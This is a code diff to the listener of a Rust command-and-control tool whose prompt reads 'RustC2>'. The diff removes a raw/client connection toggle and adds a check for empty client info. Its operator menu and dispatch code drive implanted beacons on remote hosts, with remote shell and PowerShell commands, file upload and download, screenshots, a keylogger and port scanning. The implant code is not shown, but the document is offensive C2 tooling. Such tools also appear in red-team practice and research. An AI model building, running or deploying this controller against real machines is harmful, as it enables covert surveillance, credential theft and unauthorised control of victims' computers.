@@ -20,8 +20,6 @@ fn print_help() -> String {
     output.push_str("  <args> are required, [args] are optional\n");
     output.push_str("  help                  Show this menu\n");
     output.push_str("  shell <cmd>           Run a local shell command\n");
-    output.push_str("  connection <raw|client> Switches between a raw or c2 client connection\n");
-    output.push_str("       Client connection by default, toggles when run with no arguments.\n");
     output.push_str("\n  ------------------------------------------------------------- \n");
     output.push_str("  Commands available when client is connected\n");
     output.push_str("  ------------------------------------------------------------- \n\n");
@@ -35,8 +33,8 @@ fn print_help() -> String {
 
     output.push_str("  upload <ID> <file> <dest>        Upload a file to a host\n");
     output.push_str("  download <ID> <file> <dest>      Download a file from a host\n");
-    output.push_str("  screenshot <ID>                  Upload a file to a host\n");
-    output.push_str("  keylogger <ID> on/off            Upload a file to a host\n");
+    output.push_str("  screenshot <ID>                  Take a screenshot\n");
+    output.push_str("  keylogger <ID> on/off            Keylogger\n");
     output.push_str("  portscan <ID> <IP> <NUM1> <NUM2> Port scan a host\n");
     output.push_str("  kill <ID>                        Kills the beacon on the host\n");
     output.push_str("  exit                             Close all connections and exit(ctrl+d)\n\n");
@@ -58,8 +56,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>> = Arc::new(Mutex::new(HashMap::new()));
     let active_connections_clone = active_connections.clone();
-    let raw_connection = Arc::new(Mutex::new(false));
-    let raw_connection_clone = raw_connection.clone();
 
     println!("{}",format!("Listening for incoming connections on port {} in background", port));
     // user interactive commands thread
@@ -79,23 +75,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             println!("{}",print_help())
                         } else if command.starts_with("shell ") {
                             locals::spawn_shell(command);
-                        } else if command.starts_with("connection") {
-                            let mut raw_connection_lock = raw_connection_clone.lock().await;
-                            if command.contains("raw") {
-                                *raw_connection_lock = true;
-                            } else if command.contains("client") {
-                                *raw_connection_lock = false;
-                            } else {
-                                *raw_connection_lock = !*raw_connection_lock;
-                            }
-                            println!("Listener is now {}.", if *raw_connection_lock { "raw" } else { "client" });
                         } else if command.starts_with("list") {
                             let output = utils::handle_list(&active_connections_clone).await;
                             for con in &output {
                                 println!("{}", con);
                             }
                         } else if command.starts_with("cmd") || command.starts_with("psh") {
-                            let output = utils::handle_command(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_command(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -105,7 +91,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("spawn ") {
-                            let output = spawn::handle_spawn(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = spawn::handle_spawn(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -145,7 +131,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("upload") {
-                            let output = utils::handle_upload(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_upload(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -155,7 +141,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("download") {
-                            let output = utils::handle_download(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_download(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -165,7 +151,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("screenshot") {
-                            let output = utils::handle_screenshot(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_screenshot(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -175,7 +161,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("keylogger") {
-                            let output = utils::handle_keylogger(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_keylogger(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -185,7 +171,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         }else if command.starts_with("kill") {
-                            let output = utils::handle_kill(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_kill(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -195,7 +181,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 }
                             }
                         } else if command.starts_with("portscan") {
-                            let output = utils::handle_port_scan(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            let output = utils::handle_port_scan(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
@@ -245,11 +231,17 @@ pub async fn handle_connection(
     active_connections: Arc<Mutex<HashMap<String,ConnectionInfo>>>,
     hostname: String,
     stream: TcpStream) {
-    println!("{}", "\n[+] Connection recieved!");
+    println!("{}", "[+] Connection recieved!");
     let mut stream = Arc::new(Mutex::new(stream));
     let hostname_clone = hostname.clone();
-    
+
     let (username, os, shared_secret) = utils::parse_client_info(&mut stream).await;
+    if username.is_empty() || os.is_empty() {
+        println!("Error: Invalid client info received. Disconnecting...");
+        print!("RustC2> ");
+        std::io::stdout().flush().unwrap();
+        return;
+    }
     println!("username: {}, os: {}", username, os);
     let id = {
         let mut active_connections_lock = active_connections.lock().await;
